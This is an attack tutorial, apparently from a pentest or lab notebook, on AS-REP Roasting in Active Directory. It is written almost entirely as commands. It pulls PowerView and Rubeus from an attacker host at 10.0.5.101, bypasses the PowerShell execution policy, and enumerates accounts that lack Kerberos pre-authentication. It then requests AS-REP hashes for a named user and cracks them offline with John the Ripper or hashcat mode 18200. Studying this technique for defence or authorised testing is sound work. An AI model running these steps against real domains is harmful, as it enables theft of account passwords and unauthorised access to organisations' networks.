AS-REP Roasting is an attack against **Kerberos authentication** in Active Directory (AD) that targets accounts with the property **“Do not require pre-authentication”**.  
It allows an attacker to request a **TGT (Ticket Granting Ticket)** for a user and obtain it **without knowing the user’s password**, then perform **offline password cracking**.


---

## 1) Load PowerView (in‑memory) and find candidates

Download PowerView to your attacker host and import it into memory (avoids leaving the file on disk if you `IEX` it):

```powershell
# Download PowerView to disk (optional) and import from disk
Invoke-WebRequest -Uri "http://10.0.5.101:8080/PowerView.ps1" -OutFile .\PowerView.ps1

# Start an elevated PowerShell session if needed
powershell -ExecutionPolicy Bypass

# Dot-source (import) PowerView into the current session
. .\PowerView.ps1
```

List accounts with **Do not require preauthentication** (AS‑REP roast candidates). The DONT_REQ_PREAUTH bit = `0x00400000`:

```powershell
Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }
```

---

## 2) Request AS‑REP for a user and save the blob (Rubeus)

Download Rubeus and run the AS‑REP roast command for a chosen username (`johnny` for example).

Recommended: ask Rubeus to produce output in a format compatible with John or hashcat if your Rubeus build supports it.

```powershell
# Download Rubeus.exe to the host
Invoke-WebRequest -Uri "http://10.0.5.101:8080/Rubeus.exe" -OutFile .\Rubeus.exe

# Ask KDC for the AS-REP and save in John-compatible format (if available)
.\Rubeus.exe asreproast /user:johnny /format:john /outfile:johnhash.txt

# If /format:john isn't supported, use this and inspect/convert the output:
.\Rubeus.exe asreproast /user:johnny /outfile:johnhash.txt
```

**Output example (John/hashcat style):**

```
$krb5asrep$23$johnny@DOMAIN:...BASE64DATA...
```

That string is what you crack offline.

---

## 3) Crack the AS‑REP offline (John or hashcat)

### Using John the Ripper (jumbo)

```bash
# John (jumbo) - example on Windows/Linux
john --wordlist=.\10k-worst-pass.txt --format=krb5asrep .\johnhash.txt

# Show cracked results
john --show .\johnhash.txt
```

### Using hashcat

Hashcat mode for AS‑REP is **18200** (Kerberos 5 AS-REP etype 23 aka RC4-HMAC). Example:

```bash
# If you have a hash in 'johnhash.txt' compatible with hashcat:
hashcat -m 18200 -a 0 johnhash.txt /path/to/wordlist.txt
# After cracking:
hashcat --show -m 18200 johnhash.txt
```

**Notes:**

- Use `--format=krb5asrep` with John or `-m 18200` with hashcat.
    
- Try multiple wordlists (rockyou, 10k worst passwords, targeted lists).
    
- If Rubeus provided multiple enctype blobs (AES), hash mode changes (e.g. hashcat has other modes for AES). Check Rubeus output (it usually indicates enctype).

